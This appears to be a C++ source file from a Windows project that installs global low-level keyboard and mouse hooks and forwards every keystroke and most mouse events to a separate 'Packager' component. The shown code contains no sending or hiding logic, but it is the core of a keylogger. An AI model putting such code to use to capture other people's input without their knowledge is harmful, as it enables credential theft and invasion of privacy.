#include "Hooker.hh"

Hooker::Hooker() {
	_previousPoint.x = 0;
	_previousPoint.y = 0;
	initializeHooks();
}

Hooker::~Hooker() {
	deInitializeHooks();
}

Hooker& Hooker::getInstance() {
	static Hooker	instance;
	return instance;
}

void Hooker::runHookLoop()
{
	MSG message;
	ZeroMemory(&message, sizeof(message));
	while (GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

bool Hooker::initializeHooks() {
	_kHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	if (!_kHook) {
		std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
		return false;
	}
	_mHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
	if (!_mHook) {
		std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
		return false;
	}
	return true;
}

void Hooker::deInitializeHooks() {
	UnhookWindowsHookEx(_kHook);
	UnhookWindowsHookEx(_mHook);
}

void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMouse) {
	if (isMouse) {
		MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
		if (wParam == WM_MOUSEMOVE) {
			if (((std::abs(std::abs(mouseStruct->pt.x) - std::abs(_previousPoint.x)) >= 100) ||					// Prevents mouse move spam
				std::abs(std::abs(mouseStruct->pt.y) - std::abs(_previousPoint.y)) >= 100)) {
				_previousPoint.x = mouseStruct->pt.x;
				_previousPoint.y = mouseStruct->pt.y;
				_packager->addClick(nCode, wParam, lParam);	// MOUSEMOVEMENT
			}
		}
		else {
			_packager->addClick(nCode, wParam, lParam);	// MOUSEINPUT
		}
	}
	else {
		_packager->addKey(nCode, wParam, lParam);
	}
}

void Hooker::setPackager(Packager* packager) {
	_packager = packager;
}


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	Hooker& hooker = Hooker::getInstance();
	if (nCode >= 0)
		hooker.receiveCallback(nCode, wParam, lParam);
	return CallNextHookEx(0, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
	Hooker& hooker = Hooker::getInstance();
	if (nCode >= 0)
		hooker.receiveCallback(nCode, wParam, lParam, true);
	return CallNextHookEx(0, nCode, wParam, lParam);
}

